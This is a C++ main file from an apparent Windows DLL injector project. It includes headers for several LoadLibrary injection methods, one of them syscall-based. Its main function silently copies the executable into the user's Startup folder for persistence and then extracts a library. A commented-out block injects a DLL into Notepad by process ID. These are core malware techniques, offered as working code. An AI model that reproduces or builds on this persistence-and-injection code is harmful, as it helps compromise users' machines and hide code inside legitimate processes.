#include <iostream>
#include <string>
#include "InjectorStrategy/InjectorLoadLibrary/InjectorLoadLibraryDefault.h"
#include "InjectorStrategy/InjectorLoadLibrary/InjectorLoadLibraryUndocumented.h"
#include "InjectorStrategy/InjectorLoadLibrary/InjectorLoadLibrarySyscall.h"
#include "Utils/ProcUtils.h"
#include "Utils/FilesystemUtils.h"

#define COPY_TO_STARTUP_FOLDER true

//    const std::wstring dllPath = GetAbsolutePathOfFile(L"library.dll");
//    DWORD notepadPid = GetPidByName(L"Notepad.exe");
//
//    std::wcout << L"Notepad PID: " << notepadPid<<std::endl;
//    std::wcout << L"Dll full path: " << dllPath<<std::endl;
//
//    InjectProcessUndocumented(notepadPid, dllPath);




int main() {

    // Start routine
    // Ensures the exe and the dll is present in the startup folder
    std::wstring startupFolder = GetStartupFolder();
    std::wstring selfFolder = GetSelfFolder();
    if(selfFolder != startupFolder && COPY_TO_STARTUP_FOLDER){
        bool result = CopyFileToFolder(GetSelfPath(), startupFolder);
        if(result){
            std::wcout << L"Successfully copied the executable to the startup folder." << std::endl;
        } else {
            std::wcerr << L"Failed to copy the executable to the startup folder." << std::endl;
        }
    }

    ExtractLibrary();


    return 0;
}